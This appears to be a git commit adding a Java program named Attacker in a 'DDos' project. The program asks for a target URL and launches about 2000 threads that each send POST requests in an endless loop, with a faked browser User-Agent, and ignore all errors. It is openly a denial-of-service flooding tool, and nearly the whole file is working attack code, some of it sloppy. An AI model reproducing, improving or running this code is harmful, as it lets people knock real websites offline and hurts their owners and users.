aeb1c3dbe1ad4d7b82b6dea108ddc8b498b55c2c
hacking93f <hacking93f@gmail.com>
2020-10-02 00:37:33 +0200

    app corso

---
+++ DDos/src/Ddos/Attacker.java
@@ -0,0 +1,70 @@
+package Ddos;
+
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.Scanner;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+public class Attacker { 
+	
+	
+	
+    public static void main(String... args) throws Exception {
+
+      	
+           
+    	    System.out.print("inserisci l'url :");
+            for (int i = 0; i <= 2000; i++) {
+            DdosThread thread = new DdosThread();
+            thread.start();
+            
+        } 
+    } 
+ 
+    public static class DdosThread extends Thread {
+ 
+        private AtomicBoolean running = new AtomicBoolean(true);
+     
+        private URL url;
+       Attacker a = new Attacker();
+       Scanner sc  = new Scanner(System.in);
+       
+       String richiesta=sc.nextLine();
+      
+        String param = null;
+        public DdosThread() throws Exception {
+            url = new URL(richiesta);
+            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+        } 
+ 
+        
+        @Override 
+        public void run() { 
+            while (running.get()) {
+                try { 
+                    attack(); 
+                } catch (Exception e) {
+ 
+                } 
+ 
+ 
+            } 
+        } 
+ 
+        public void attack() throws Exception {
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setDoOutput(true);
+            connection.setDoInput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("charset", "utf-8");
+            connection.setRequestProperty("Host", "localhost");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
+            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            connection.setRequestProperty("Content-Length", param);
+            System.out.println(this + " " + connection.getResponseCode()+" ms");
+            connection.getInputStream();
+        } 
+    } 
+ 
+} 
